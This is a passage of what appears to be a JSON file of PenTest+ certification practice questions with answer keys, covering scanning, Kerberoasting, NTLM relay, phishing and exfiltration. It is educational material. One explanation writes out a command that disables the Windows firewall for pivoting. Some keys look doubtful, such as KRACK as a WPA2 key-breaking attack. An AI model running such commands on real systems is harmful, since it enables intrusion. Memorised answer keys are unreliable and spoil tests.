      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 91,
      "question_text": "A penetration tester finished a security scan and uncovered numerous vulnerabilities on several hosts. Based on the targets' EPSS and CVSS scores, which of the following targets is the most likely to get attacked?",
      "options": {
        "A": "Target 1: EPSS Score = 0.6 and CVSS Score = 4",
        "B": "Target 2: EPSS Score = 0.3 and CVSS Score = 2",
        "C": "Target 3: EPSS Score = 0.6 and CVSS Score = 1",
        "D": "Target 4: EPSS Score = 0.4 and CVSS Score = 4.5"
      },
      "correct_answer": "A",
      "explanation": "EPSS and CVSS Analysis:\n\nEPSS (Exploit Prediction Scoring System) indicates the likelihood of exploitation.\n\nCVSS (Common Vulnerability Scoring System) represents the severity of the vulnerability.\n\nRationale:\n\nTarget 1 has the highest EPSS score (0.6) combined with a moderately high CVSS score (4), \nmaking it the most likely to be attacked.\n\nOther options either have lower EPSS or CVSS scores, reducing their likelihood of being \nexploited.\n\nCompTIA Pentest+ References:\n\nDomain 2.0 (Information Gathering and Vulnerability Identification)",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 160,
      "question_text": "A penetration tester identifies the following open ports during a network enumeration scan:\nPORT STATE SERVICE\n22/tcp open ssh\n80/tcp open http\n111/tcp open rpcbind\n443/tcp open https\n27017/tcp open mongodb\n50123/tcp open ms-rpc\nWhich of the following commands did the tester use to get this output?",
      "options": {
        "A": "nmap -Pn -A 10.10.10.10",
        "B": "nmap -sV 10.10.10.10",
        "C": "nmap -Pn -w 10.10.10.10",
        "D": "nmap -sV -Pn -p- 10.10.10.10"
      },
      "correct_answer": "D",
      "explanation": "To detect all open ports and enumerate services, the tester needs to:\n\nUse -sV (Service Version Detection)\n\nUse -Pn (Disables ICMP ping to bypass firewalls)\n\nUse -p- (Scans all 65,535 TCP ports)\n\nnmap -sV -Pn -p- 10.10.10.10 (Option D):\n\nThis command performs full-port scanning, including high-numbered ports like 50123/tcp (ms-rpc).\n\nWithout -p-, high ports would be missed.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 173,
      "question_text": "During a penetration test, a tester captures information about an SPN account. Which of the following attacks requires this information as a prerequisite to proceed?",
      "options": {
        "A": "Golden Ticket",
        "B": "Kerberoasting",
        "C": "DCShadow",
        "D": "LSASS dumping"
      },
      "correct_answer": "B",
      "explanation": "Kerberoasting is an attack that specifically targets Service Principal Name (SPN) accounts in a Windows \nActive Directory environment. Here’s a detailed explanation:\n\nUnderstanding SPN Accounts:\n\nSPNs are unique identifiers for services in a network that allows Kerberos to authenticate service \naccounts. These accounts are often associated with services such as SQL Server, IIS, etc.\n\nKerberoasting Attack:\n\nPrerequisite: Knowledge of the SPN account.\n\nProcess: An attacker requests a service ticket for the SPN account using the Kerberos protocol. \nThe ticket is encrypted with the service account's NTLM hash. The attacker captures this ticket \nand attempts to crack the hash offline.\n\nObjective: To obtain the plaintext password of the service account, which can then be used for \nlateral movement or privilege escalation.\n\nComparison with Other Attacks:\n\nGolden Ticket: Involves forging Kerberos TGTs using the KRBTGT account hash, requiring \ndomain admin credentials.\n\nDCShadow: Involves manipulating Active Directory data by impersonating a domain controller, \ntypically requiring high privileges.\n\nLSASS Dumping: Involves extracting credentials from the LSASS process on a Windows \nmachine, often requiring local admin privileges.\n\nKerberoasting specifically requires the SPN account information to proceed, making it the correct answer.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 4,
      "question_text": "During a penetration test, a tester attempts to pivot from one Windows 10 system to another Windows system. The penetration tester thinks a local firewall is blocking connections. Which of the following command-line utilities built into Windows is most likely to disable the firewall?",
      "options": {
        "A": "certutil.exe",
        "B": "bitsadmin.exe",
        "C": "msconfig.exe",
        "D": "netsh.exe"
      },
      "correct_answer": "D",
      "explanation": "Understanding netsh.exe:\n\nPurpose: Configures network settings, including IP addresses, DNS, and firewall settings.\n\nFirewall Management: Can enable, disable, or modify firewall rules.\n\nDisabling the Firewall:\n\nCommand: Use netsh.exe to disable the firewall.\n\nnetsh advfirewall set allprofiles state off\n\nUsage in Penetration Testing:\n\nPivoting: Disabling the firewall can help the penetration tester pivot from one system to another \nby removing network restrictions.\n\nCommand Execution: Ensure the command is executed with appropriate privileges.\n\nReferences from Pentesting Literature:\n\nnetsh.exe is commonly mentioned in penetration testing guides for configuring network settings \nand managing firewalls.\n\nHTB write-ups often reference the use of netsh.exe for managing firewall settings during network-\nbased penetration tests.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 166,
      "question_text": "You are a penetration tester reviewing a client’s website through a web browser.\nINSTRUCTIONS\nReview all components of the website through the browser to determine if vulnerabilities are present.\nRemediate ONLY the highest vulnerability from either the certificate, source, or cookies.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.\n[Simulation environment shows a website login page with buttons: View Certificate, View Source, View Cookies, Remediate Certificate, Remediate Source, Remediate Cookies. Clicking reveals certificate details (expired), source code (with hardcoded credentials in comments), and cookies (session cookie without HttpOnly/Secure flags).]",
      "options": null,
      "correct_answer": null,
      "explanation": "Step 1: Generate a Certificate Signing Request (CSR)\nStep 2: Submit CSR to the CA\nStep 3: Install re-issued certificate on the server\nStep 4: Remove certificate from server",
      "is_simulation": true,
      "simulation_details": "Interactive simulation. User reviews Certificate, Source Code, and Cookies. Certificate is expired. Source code contains hardcoded credentials (`<!-- <input type=\"hidden\" name=\"debug_user\" value=\"admin\"><input type=\"hidden\" name=\"debug_pass\" value=\"password123\"> -->`). Cookies lack HttpOnly/Secure flags. User must identify the highest risk (likely hardcoded credentials) and click the 'Remediate Source' button. The explanation provided in the OCR (`Generate CSR...`) seems to relate to remediating the *certificate*, not the highest vulnerability found.",
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "simulation"
    },
    {
      "question_number": 126,
      "question_text": "A penetration tester is conducting an assessment of a web application's login page. The tester needs to determine whether there are any hidden form fields of interest. Which of the following is the most effective technique?",
      "options": {
        "A": "XSS",
        "B": "On-path attack",
        "C": "SQL injection",
        "D": "HTML scraping"
      },
      "correct_answer": "D",
      "explanation": "Hidden form fields in web applications can store user roles, session tokens, and security parameters that \nattackers may exploit.\n\nHTML scraping (Option D):\n\nInvolves analyzing HTML source code to find hidden fields like:\n<input type=\"hidden\" name=\"admin_access\" value=\"true\">\n\nAttackers use tools like Burp Suite, ZAP, or browser developer tools (Ctrl+U or Inspect Element) to locate \nhidden fields.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 128,
      "question_text": "A penetration tester launches an attack against company employees. The tester clones the company's intranet login page and sends the link via email to all employees.\nWhich of the following best describes the objective and tool selected by the tester to perform this activity?",
      "options": {
        "A": "Gaining remote access using BeEF",
        "B": "Obtaining the list of email addresses using theHarvester",
        "C": "Harvesting credentials using SET",
        "D": "Launching a phishing campaign using GoPhish"
      },
      "correct_answer": "C",
      "explanation": "The tester is conducting a phishing attack by cloning the company's login page to steal employee credentials.\n\nOption A (BeEF) #: BeEF is used for browser exploitation, not phishing.\n\nOption B (theHarvester) #: Used for OSINT, gathering emails, but does not conduct phishing attacks.\n\nOption C (SET - Social Engineering Toolkit) #: Correct.\n\nSET allows testers to clone web pages and perform phishing attacks.\n\nOption D (GoPhish) #: GoPhish is a phishing simulation tool, but SET is specifically designed for \ncredential harvesting.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Social Engineering & Phishing Attacks",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 109,
      "question_text": "During a security assessment, a penetration tester wants to compromise user accounts without triggering IDS/IPS detection rules. Which of the following is the most effective way for the tester to accomplish this task?",
      "options": {
        "A": "Crack user accounts using compromised hashes.",
        "B": "Brute force accounts using a dictionary attack.",
        "C": "Bypass authentication using SQL injection.",
        "D": "Compromise user accounts using an XSS attack."
      },
      "correct_answer": "A",
      "explanation": "To avoid triggering IDS/IPS alerts, the attacker should use offline cracking on compromised hashes rather \nthan direct brute-force attempts.\n\nCrack user accounts using compromised hashes (Option A):\n\nHashes can be cracked offline using tools like Hashcat or John the Ripper.\n\nNo direct login attempts, avoiding detection by security systems.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 47,
      "question_text": "During an assessment, a penetration tester wants to extend the vulnerability search to include the use of dynamic testing. Which of the following tools should the tester use?",
      "options": {
        "A": "Mimikatz",
        "B": "ZAP",
        "C": "OllyDbg",
        "D": "SonarQube"
      },
      "correct_answer": "B",
      "explanation": "Dynamic Application Security Testing (DAST):\n\nDefinition: DAST involves testing the application in its running state to identify vulnerabilities \nthat could be exploited by an attacker.\n\nPurpose: Simulates attacks on a live application, examining how it behaves and identifying \nsecurity weaknesses.\n\nZAP (Zed Attack Proxy):\n\nDescription: An open-source DAST tool developed by OWASP.\n\nFeatures: Capable of scanning web applications for vulnerabilities, including SQL injection, XSS, \nCSRF, and other common web application vulnerabilities.\n\nUsage: Ideal for dynamic testing as it interacts with the live application and identifies \nvulnerabilities that may not be visible in static code analysis.\n\nOther Tools:\n\nMimikatz: Used for post-exploitation activities, specifically credential dumping on Windows \nsystems.\n\nOllyDbg: A debugger used for reverse engineering and static analysis of binary files, not suitable \nfor dynamic testing.\n\nSonarQube: A static code analysis tool used for SAST (Static Application Security Testing), not \nfor dynamic testing.\n\nPentest References:\n\nWeb Application Security Testing: Utilizing DAST tools like ZAP to dynamically test and find \nvulnerabilities in running web applications.\n\nOWASP Tools: Leveraging open-source tools recommended by OWASP for comprehensive security \ntesting.\n\nBy using ZAP, the penetration tester can perform dynamic testing to identify runtime vulnerabilities in web \napplications, extending the scope of the vulnerability search.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 92,
      "question_text": "A penetration tester is performing reconnaissance for a web application assessment. Upon investigation, the tester reviews the robots.txt file for items of interest.\nINSTRUCTIONS\nSelect the tool the penetration tester should use for further investigation.\nSelect the two entries in the robots.txt file that the penetration tester should recommend for removal.\n[Simulation interface shows a robots.txt file content and a list of tools (Mimikatz, WPScan, Brakeman, SQLmap) to select from. robots.txt includes entries like Disallow: /search, Allow: /search/about, Disallow: /Home, User-agent: Slurp, Allow: /admin, Allow: /wp-admin, Allow: /groups, Disallow: /tmp, Allow: /wp-login.php]",
      "options": null,
      "correct_answer": null,
      "explanation": "The tool that the penetration tester should use for further investigation is WPScan. This is because WPScan is \na WordPress vulnerability scanner that can detect common WordPress security issues, such as weak \npasswords, outdated plugins, and misconfigured settings. WPScan can also enumerate WordPress users, \nthemes, and plugins from the robots.txt file.\n\nThe two entries in the robots.txt file that the penetration tester should recommend for removal are:\nAllow: /admin\nAllow: /wp-admin\nThese entries expose the WordPress admin panel, which can be a target for brute-force attacks, SQL injection, \nand other exploits. Removing these entries can help prevent unauthorized access to the web application’s \nbackend. Alternatively, the penetration tester can suggest renaming the admin panel to a less obvious name, or \nadding authentication methods such as two-factor authentication or IP whitelisting.",
      "is_simulation": true,
      "simulation_details": "User is presented with content of a robots.txt file. They need to select the appropriate scanning tool (WPScan) from a list via radio button and select two specific 'Allow' entries (/admin, /wp-admin) from the robots.txt content using checkboxes.",
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "simulation"
    },
    {
      "question_number": 105,
      "question_text": "During a routine penetration test, the client’s security team observes logging alerts that indicate several ID badges were reprinted after working hours without authorization. Which of the following is the penetration tester most likely trying to do?",
      "options": {
        "A": "Obtain long-term, valid access to the facility",
        "B": "Disrupt the availability of facility access systems",
        "C": "Change access to the facility for valid users",
        "D": "Revoke access to the facility for valid users"
      },
      "correct_answer": "A",
      "explanation": "The unauthorized reprinting of ID badges suggests the penetration tester is attempting physical security \npenetration testing to gain long-term access.\n\nOption A (Obtain long-term, valid access) #: Correct. Cloning or reprinting badges allows persistent \naccess past security checks.\n\nOption B (Disrupt availability) #: There is no indication of a denial-of-service attack.\n\nOption C (Change access for valid users) #: The goal is not modifying user access, but rather gaining \nunauthorized access.\n\nOption D (Revoke access for valid users) #: The logs show new badges being printed, not revocation.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Physical Security Testing",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 22,
      "question_text": "A penetration tester runs a vulnerability scan that identifies several issues across numerous customer hosts. The executive report outlines the following information:\nServer High-severity vulnerabilities\n1. Development sandbox server 32\n2. Back office file transfer server 51\n3. Perimeter network web server 14\n4. Developer QA server 92\nThe client is concerned about the availability of their consumer-facing production application. Which of the following hosts should the penetration tester select for additional manual testing?",
      "options": {
        "A": "Server 1",
        "B": "Server 2",
        "C": "Server 3",
        "D": "Server 4"
      },
      "correct_answer": "C",
      "explanation": "Client Concern:\n\nAvailability: The client is specifically concerned about the availability of their consumer-facing \nproduction application. Ensuring this application is secure and available is crucial to the business.\n\nServer Analysis:\n\nServer 1 (Development sandbox server): Typically not a production server; vulnerabilities here \nare less likely to impact the consumer-facing application.\n\nServer 2 (Back office file transfer server): Important but generally more internal-facing and less \nlikely to directly affect the consumer-facing application.\n\nServer 3 (Perimeter network web server): Likely hosts the consumer-facing application or critical \nservices related to it. High-severity vulnerabilities here could directly impact availability.\n\nServer 4 (Developer QA server): Similar to Server 1, more likely to be used for testing rather than \nproduction, making it less critical for immediate manual testing.\n\nPentest References:\n\nRisk Prioritization: Focus on assets that have the most significant impact on business operations, \nespecially those directly facing consumers.\n\nCritical Infrastructure: Ensuring the security and availability of web servers exposed to the \ninternet as they are prime targets for attacks.\n\nBy selecting Server 3 (the perimeter network web server) for additional manual testing, the penetration tester \naddresses the client's primary concern about the availability and security of the consumer-facing production \napplication.\n=================",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 156,
      "question_text": "A consultant starts a network penetration test. The consultant uses a laptop that is hardwired to the network to try to assess the network with the appropriate tools. Which of the following should the consultant engage first?",
      "options": {
        "A": "Service discovery",
        "B": "OS fingerprinting",
        "C": "Host discovery",
        "D": "DNS enumeration"
      },
      "correct_answer": "C",
      "explanation": "In network penetration testing, the initial steps involve gathering information to build an understanding of the \nnetwork's structure, devices, and potential entry points. The process generally follows a structured approach, \nstarting from broad discovery methods to more specific identification techniques. Here's a comprehensive \nbreakdown of the steps:\n\nHost Discovery (Answer: C):\n\nObjective: Identify live hosts on the network.\n\nTools & Techniques:\n\nPing Sweep: Using tools like nmap with the -sn option (ping scan) to check for live hosts \nby sending ICMP Echo requests.\n\nARP Scan: Useful in local networks, arp-scan can help identify all devices on the local \nsubnet by broadcasting ARP requests.\n\nnmap -sn 192.168.1.0/24\n\n References:\n\nThe GoBox HTB write-up emphasizes the importance of identifying hosts before moving to \nservice enumeration.\n\nThe Forge HTB write-up also highlights using Nmap for initial host discovery in its enumeration \nphase.\n\n Service Discovery (Option A):\n\nObjective: After identifying live hosts, determine the services running on them.\n\nTools & Techniques:\n\nNmap: Often used with options like -sV for version detection to identify services.\n\nnmap -sV 192.168.1.100\n\n References:\n\nAs seen in multiple write-ups (e.g., Anubis HTB and Bolt HTB), service discovery follows host \nidentification to understand the services available for potential exploitation.\n\n OS Fingerprinting (Option B):\n\nObjective: Determine the operating system of the identified hosts.\n\nTools & Techniques:\n\nNmap: With the -O option for OS detection.\n\nnmap -O 192.168.1.100\n\n References:\n\nAccurate OS fingerprinting helps tailor subsequent attacks and is often performed after host and \nservice discovery, as highlighted in the write-ups.\n\n DNS Enumeration (Option D):\n\nObjective: Identify DNS records and gather subdomains related to the target domain.\n\nTools & Techniques:\n\ndnsenum, dnsrecon, and dig.\n\ndnsenum example.com",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 179,
      "question_text": "During a penetration test, a junior tester uses Hunter.io for an assessment and plans to review the information that will be collected. Which of the following describes the information the junior tester will receive from the Hunter.io tool?",
      "options": {
        "A": "A collection of email addresses for the target domain that is available on multiple sources on the internet",
        "B": "DNS records for the target domain and subdomains that could be used to increase the external attack surface",
        "C": "Data breach information about the organization that could be used for additional enumeration",
        "D": "Information from the target's main web page that collects usernames, metadata, and possible data exposures"
      },
      "correct_answer": "A",
      "explanation": "Hunter.io is a tool used for finding professional email addresses associated with a domain. Here’s what it \nprovides:\n\nFunctionality of Hunter.io:\n\nEmail Address Collection: Gathers email addresses associated with a target domain from various \nsources across the internet.\n\nVerification: Validates the email addresses to ensure they are deliverable.\n\nSources: Aggregates data from public sources, company websites, and other internet databases.\n\nComparison with Other Options:\n\nDNS Records (B): Hunter.io does not focus on DNS records; tools like dig or nslookup are used \nfor DNS information.\n\nData Breach Information (C): Services like Have I Been Pwned are used for data breach \ninformation.\n\nWeb Page Information (D): Tools like wget, curl, or specific web scraping tools are used for \ncollecting detailed web page information.\n\nHunter.io is specifically designed to collect and validate email addresses for a given domain, making it the \ncorrect answer.\n=================",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 45,
      "question_text": "Which of the following is the most efficient way to infiltrate a file containing data that could be sensitive?",
      "options": {
        "A": "Use steganography and send the file over FTP",
        "B": "Compress the file and send it using TFTP",
        "C": "Split the file in tiny pieces and send it over dnscat",
        "D": "Encrypt and send the file over HTTPS"
      },
      "correct_answer": "D",
      "explanation": "When considering efficiency and security for exfiltrating sensitive data, the chosen method must ensure data \nconfidentiality and minimize the risk of detection. Here’s an analysis of each option:\n\nUse steganography and send the file over FTP (Option A):\n\nExplanation: Steganography hides data within other files, such as images. FTP is a protocol for \ntransferring files.\n\nDrawbacks: FTP is not secure as it transmits data in clear text, making it susceptible to \ninterception. Steganography can add an extra layer of obfuscation, but the use of FTP makes this \noption insecure.\n\nCompress the file and send it using TFTP (Option B):\n\nExplanation: TFTP is a simple file transfer protocol that lacks encryption.\n\nDrawbacks: TFTP is inherently insecure because it does not support encryption, making it easy \nfor attackers to intercept the data during transfer.\n\nSplit the file in tiny pieces and send it over dnscat (Option C):\n\nExplanation: dnscat is a tool for tunneling data over DNS.\n\nDrawbacks: While effective at evading detection by using DNS, splitting the file and managing \nthe reassembly adds complexity. Additionally, large data transfers over DNS can raise suspicion.\n\nEncrypt and send the file over HTTPS (Answer: D):\n\nExplanation: Encrypting the file ensures that its contents are protected during transfer. HTTPS \nprovides a secure, encrypted channel for communication over the internet.\n\nAdvantages: HTTPS is widely used and trusted, making it less likely to raise suspicion. \nEncryption ensures the data remains confidential during transit.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 88,
      "question_text": "Which of the following describes the process of determining why a vulnerability scanner is not providing results?",
      "options": {
        "A": "Root cause analysis",
        "B": "Secure distribution",
        "C": "Peer review",
        "D": "Goal reprioritization"
      },
      "correct_answer": "A",
      "explanation": "Root cause analysis involves identifying the underlying reasons why a problem is occurring. In the context of \na vulnerability scanner not providing results, performing a root cause analysis would help determine why the \nscanner is failing to deliver the expected output. Here’s why option A is correct:\n\nRoot Cause Analysis: This is a systematic process used to identify the fundamental reasons for a \nproblem. It involves investigating various potential causes and pinpointing the exact issue that is \npreventing the vulnerability scanner from working correctly.\n\nSecure Distribution: This refers to the secure delivery and distribution of software or updates, which is \nnot relevant to troubleshooting a vulnerability scanner.\n\nPeer Review: This involves evaluating work by others in the same field to ensure quality and accuracy, \nbut it is not directly related to identifying why a tool is malfunctioning.\n\nGoal Reprioritization: This involves changing the priorities of goals within a project, which does not \naddress the technical issue of the scanner not working.\n\nReferences from Pentest:\n\nHorizontall HTB: Demonstrates the process of troubleshooting and identifying issues with tools and \ntheir configurations to ensure they work correctly.\n\nWriteup HTB: Emphasizes the importance of thorough analysis to understand why certain security tools \nmay fail during an assessment.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 217,
      "question_text": "A penetration tester compromises a Windows OS endpoint that is joined to an Active Directory local environment. Which of the following tools should the tester use to manipulate authentication mechanisms to move laterally in the network?",
      "options": {
        "A": "Rubeus",
        "B": "WinPEAS",
        "C": "NTLMRelayX",
        "D": "Impacket"
      },
      "correct_answer": "A",
      "explanation": "Rubeus is a post-exploitation tool used for Kerberos abuse, including ticket extraction, pass-the-ticket, ticket \nrenewal, and Kerberoasting. It's ideal for lateral movement within Active Directory environments.\n\nWinPEAS is mainly used for local privilege escalation and enumeration.\n\nNTLMRelayX (from Impacket) is useful for relaying NTLM authentication but is not focused on \nKerberos.\n\nImpacket is a collection of tools; Rubeus is more targeted for Kerberos attacks.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 211,
      "question_text": "A penetration tester is conducting reconnaissance on a target network. The tester runs the following Nmap command: nmap -sv -sT -p - 192.168.1.0/24. Which of the following describes the most likely purpose of this scan?",
      "options": {
        "A": "OS fingerprinting",
        "B": "Attack path mapping",
        "C": "Service discovery",
        "D": "User enumeration"
      },
      "correct_answer": "C",
      "explanation": "The Nmap command nmap -sv -sT -p- 192.168.1.0/24 is designed to discover services on a network. Here is a \nbreakdown of the command and its purpose:\n\nCommand Breakdown:\n\nnmap: The network scanning tool.\n\n-sv: Enables service version detection. This option tells Nmap to determine the version of the \nservices running on open ports.\n\n-sT: Performs a TCP connect scan. This is a more reliable method of scanning as it completes the \nTCP handshake but can be easily detected by firewalls and intrusion detection systems.\n\n-p-: Scans all 65535 ports. This ensures a comprehensive scan of all possible TCP ports.\n\n192.168.1.0/24: Specifies the target network range (subnet) to be scanned.\n\nPurpose of the Scan:\n\nService Discovery (Answer: C): The primary purpose of this scan is to discover which services \nare running on the network's hosts and determine their versions. This information is crucial for \nidentifying potential vulnerabilities and understanding the network's exposure.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 197,
      "question_text": "A penetration tester attempts to run an automated web application scanner against a target URL. The tester validates that the web page is accessible from a different device. The tester analyzes the following HTTP request header logging output:\n200; GET /login.aspx HTTP/1.1 Host: foo.com; User-Agent: Mozilla/5.0\nNo response; POST /login.aspx HTTP/1.1 Host: foo.com; User-Agent: curl\n200; POST /login.aspx HTTP/1.1 Host: foo.com; User-Agent: Mozilla/5.0\nNo response; GET /login.aspx HTTP/1.1 Host: foo.com; User-Agent: python\nWhich of the following actions should the tester take to get the scans to work properly?",
      "options": {
        "A": "Modify the scanner to slow down the scan.",
        "B": "Change the source IP with a VPN.",
        "C": "Modify the scanner to only use HTTP GET requests.",
        "D": "Modify the scanner user agent."
      },
      "correct_answer": "D",
      "explanation": "The logs show that requests with standard browser User-Agent strings (Mozilla/5.0) receive a 200 OK response, while requests with non-standard User-Agents (curl, python) receive no response. This indicates the server or a WAF is filtering requests based on the User-Agent header. Modifying the scanner's User-Agent to mimic a standard browser (like Mozilla/5.0) should allow the scan requests to pass the filter.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 38,
      "question_text": "A tester runs an Nmap scan against a Windows server and receives the following results:\nNmap scan report for win_dns.local (10.0.0.5)\nHost is up (0.014s latency)\nPort State Service\n53/tcp open domain\n161/tcp open snmp\n445/tcp open smb-ds\n3389/tcp open rdp\nWhich of the following TCP ports should be prioritized for using hash-based relays?",
      "options": {
        "A": "53",
        "B": "161",
        "C": "445",
        "D": "3389"
      },
      "correct_answer": "C",
      "explanation": "Port 445 is used for SMB (Server Message Block) services, which are commonly targeted for hash-based \nrelay attacks like NTLM relay attacks.\n\nUnderstanding Hash-Based Relays:\n\nNTLM Relay Attack: An attacker intercepts and relays NTLM authentication requests to another \nservice, effectively performing authentication on behalf of the victim.\n\nSMB Protocol: Port 445 is used for SMB/CIFS traffic, which supports NTLM authentication.\n\nPrioritizing Port 445:\n\nVulnerability: SMB is often targeted because it frequently supports NTLM authentication, \nmaking it susceptible to relay attacks.\n\nTools: Tools like Responder and NTLMRelayX are commonly used to capture and relay NTLM \nhashes over SMB.\n\nExecution:\n\nCapture Hash: Use a tool like Responder to capture NTLM hashes.\n\nRelay Hash: Use a tool like NTLMRelayX to relay the captured hash to another service on port \n445.\n\nReferences from Pentesting Literature:\n\nPenetration testing guides frequently discuss targeting SMB (port 445) for hash-based relay \nattacks.\n\nHTB write-ups often include examples of NTLM relay attacks using port 445.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups\n=================",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 3,
      "question_text": "A penetration tester plans to conduct reconnaissance during an engagement using readily available resources. Which of the following resources would most likely identify hardware and software being utilized by the client?",
      "options": {
        "A": "Cryptographic flaws",
        "B": "Protocol scanning",
        "C": "Cached pages",
        "D": "Job boards"
      },
      "correct_answer": "D",
      "explanation": "To conduct reconnaissance and identify hardware and software used by a client, job boards are an effective \nresource. Companies often list the technologies they use in job postings to attract qualified candidates. These \nlistings can provide valuable insights into the specific hardware and software platforms the client is utilizing.\n\nReconnaissance:\n\nThis is the first phase in penetration testing, involving gathering as much information as possible \nabout the target.\n\nReconnaissance can be divided into two types: passive and active. Job boards fall under passive \nreconnaissance, where the tester gathers information without directly interacting with the target \nsystems.\n\nJob Boards:\n\nJob postings often include detailed descriptions of the technologies and tools used within the \ncompany.\n\nFor example, a job posting for a network administrator might list specific brands of hardware \n(like Cisco routers) or software (like VMware).\n\nExamples of Job Boards:\n\nWebsites like LinkedIn, Indeed, Glassdoor, and company career pages can be used to find \nrelevant job postings.\n\nThese postings might mention operating systems (Windows, Linux), development frameworks \n(Spring, .NET), databases (Oracle, MySQL), and more.\n\nPentest References:\n\nOSINT (Open Source Intelligence): Using publicly available sources to gather information about a \ntarget.\n\nJob boards are a key source of OSINT, providing indirect access to the internal technologies of a \ncompany.\n\nThis information can be used to tailor subsequent phases of the penetration test, such as vulnerability \nscanning and exploitation, to the specific technologies identified.\n\nBy examining job boards, a penetration tester can gain insights into the hardware and software environments \nof the target, making this a valuable reconnaissance tool.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 69,
      "question_text": "A penetration tester observes the following output from an Nmap command while attempting to troubleshoot connectivity to a Linux server:\nStarting Nmap 7.91 ( https://nmap.org ) at 2024-01-10 12:00 UTC\nNmap scan report for example.com (192.168.1.10)\nHost is up (0.001s latency).\nNot shown: 9999 closed ports\nPORT STATE SERVICE\n21/tcp open ftp\n80/tcp open http\n135/tcp open msrpc\n139/tcp open netbios-ssn\n443/tcp open https\n2222/tcp open ssh\n444/tcp open microsoft-ds\nNmap done: 1 IP address (1 host up) scanned in 0.23 seconds\nWhich of the following is the most likely reason for the connectivity issue?",
      "options": {
        "A": "The SSH service is running on a different port.",
        "B": "The SSH service is blocked by a firewall.",
        "C": "The SSH service requires certificate authentication.",
        "D": "The SSH service is not active."
      },
      "correct_answer": "A",
      "explanation": "The key detail in the Nmap scan output is that port 2222/tcp is open and running the SSH service. The \nstandard SSH port is 22, so if the tester was attempting to connect on port 22, they would not succeed because \nSSH is instead listening on port 2222.\n\nThis is a common security hardening tactic—moving services to non-standard ports to reduce \nautomated attacks.\n\nThere is no indication that the service is blocked (B), or requires certificates (C), or is inactive (D), \nbecause Nmap clearly shows the service is open and identified.\n\nCompTIA PenTest+ Reference:\n\nPT0-003 Objective 3.3: Analyze tool output or data related to engagement activities.\n\nNmap usage and interpreting scan results is emphasized in multiple sections.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 200,
      "question_text": "During an engagement, a penetration tester needs to break the key for the Wi-Fi network that uses WPA2 encryption. Which of the following attacks would accomplish this objective?",
      "options": {
        "A": "ChopChop",
        "B": "Replay",
        "C": "Initialization vector",
        "D": "KRACK"
      },
      "correct_answer": "D",
